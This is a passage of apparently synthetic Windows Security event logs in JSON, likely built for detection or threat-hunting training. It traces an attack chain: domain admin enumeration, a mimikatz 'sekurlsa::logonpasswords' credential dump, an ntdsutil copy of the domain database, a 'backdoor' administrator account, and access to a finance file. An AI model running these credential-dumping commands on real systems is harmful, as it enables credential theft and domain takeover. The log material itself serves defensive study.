    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\net.exe\n  Command Line: net.exe group \"Domain Admins\" /domain\n  Creator Process Name: C:\\Windows\\System32\\net.exe"
  },
  {
    "@timestamp": "2026-04-01T12:13:55Z",
    "Hostname": "WS02",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "mallory",
    "SubjectLogonId": "0x21F8AC6",
    "NewProcessName": "C:\\Windows\\System32\\ipconfig.exe",
    "CommandLine": "ipconfig.exe /all",
    "ParentProcessName": "C:\\Windows\\System32\\net.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\ipconfig.exe\n  Command Line: ipconfig.exe /all\n  Creator Process Name: C:\\Windows\\System32\\net.exe"
  },
  {
    "@timestamp": "2026-04-01T12:14:06Z",
    "Hostname": "WS02",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "mallory",
    "SubjectLogonId": "0x21F8AC6",
    "NewProcessName": "C:\\Tools\\mimikatz.exe",
    "CommandLine": "mimikatz.exe sekurlsa::logonpasswords exit",
    "ParentProcessName": "C:\\Windows\\System32\\ipconfig.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Tools\\mimikatz.exe\n  Command Line: mimikatz.exe sekurlsa::logonpasswords exit\n  Creator Process Name: C:\\Windows\\System32\\ipconfig.exe"
  },
  {
    "@timestamp": "2026-04-01T12:14:14Z",
    "Hostname": "DC01",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "admin",
    "TargetLogonId": "0xAB09153",
    "LogonType": 3,
    "IpAddress": "10.0.1.50",
    "WorkstationName": "WS02",
    "LogonGuid": "{EEEA163E-2338-7D12-BD32-50C448F4EF12}",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: admin\n  Account Domain: CORP\n  Logon ID: 0xAB09153\n  Logon GUID: {EEEA163E-2338-7D12-BD32-50C448F4EF12}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: WS02\n  Source Network Address: 10.0.1.50"
  },
  {
    "@timestamp": "2026-04-01T12:14:16Z",
    "Hostname": "DC01",
    "EventID": 4672,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "admin",
    "SubjectLogonId": "0xAB09153",
    "PrivilegeList": "SeDebugPrivilege,SeBackupPrivilege,SeRestorePrivilege",
    "raw_message": "Special privileges assigned to new logon.\n  Account Name: admin\n  Logon ID: 0xAB09153\n  Privileges: SeDebugPrivilege,SeBackupPrivilege,SeRestorePrivilege"
  },
  {
    "@timestamp": "2026-04-01T12:14:21Z",
    "Hostname": "DC01",
    "EventID": 4688,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "admin",
    "SubjectLogonId": "0xAB09153",
    "NewProcessName": "C:\\Windows\\System32\\ntdsutil.exe",
    "CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\dump\" q q",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: admin\n  Logon ID: 0xAB09153\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\ntdsutil.exe\n  Command Line: ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\dump\" q q\n  Creator Process Name: C:\\Windows\\System32\\cmd.exe"
  },
  {
    "@timestamp": "2026-04-01T12:14:27Z",
    "Hostname": "DC01",
    "EventID": 4720,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "admin",
    "SubjectLogonId": "0xAB09153",
    "TargetUserName": "backdoor",
    "raw_message": "A user account was created.\nSubject:\n  Account Name: admin\n  Logon ID: 0xAB09153\nNew Account:\n  Account Name: backdoor\n  Account Domain: CORP"
  },
  {
    "@timestamp": "2026-04-01T12:14:31Z",
    "Hostname": "DC01",
    "EventID": 4732,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "admin",
    "SubjectLogonId": "0xAB09153",
    "MemberName": "CORP\\backdoor",
    "TargetUserName": "Administrators",
    "raw_message": "A member was added to a security-enabled local group.\nSubject:\n  Account Name: admin\n  Logon ID: 0xAB09153\nMember:\n  Account Name: CORP\\backdoor\nGroup:\n  Group Name: Administrators"
  },
  {
    "@timestamp": "2026-04-01T12:14:49Z",
    "Hostname": "FILESERVER",
    "EventID": 4624,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "TargetUserName": "admin",
    "TargetLogonId": "0xD13DBC9",
    "LogonType": 3,
    "IpAddress": "10.0.1.50",
    "WorkstationName": "DC01",
    "LogonGuid": "{EEEA163E-2338-7D12-BD32-50C448F4EF12}",
    "ProcessName": "-",
    "SubjectUserName": "-",
    "SubjectLogonId": "0x0",
    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: admin\n  Account Domain: CORP\n  Logon ID: 0xD13DBC9\n  Logon GUID: {EEEA163E-2338-7D12-BD32-50C448F4EF12}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: DC01\n  Source Network Address: 10.0.1.50"
  },
  {
    "@timestamp": "2026-04-01T12:14:53Z",
    "Hostname": "FILESERVER",
    "EventID": 4663,
    "Channel": "Security",
    "TargetDomainName": "CORP",
    "SubjectUserName": "admin",
    "SubjectLogonId": "0xD13DBC9",
    "ObjectName": "C:\\Shares\\Finance\\secret.xlsx",
    "AccessMask": "0x80",
    "raw_message": "An attempt was made to access an object.\n  Account Name: admin\n  Logon ID: 0xD13DBC9\n  Object Name: C:\\Shares\\Finance\\secret.xlsx\n  Access Mask: 0x80"
  }
]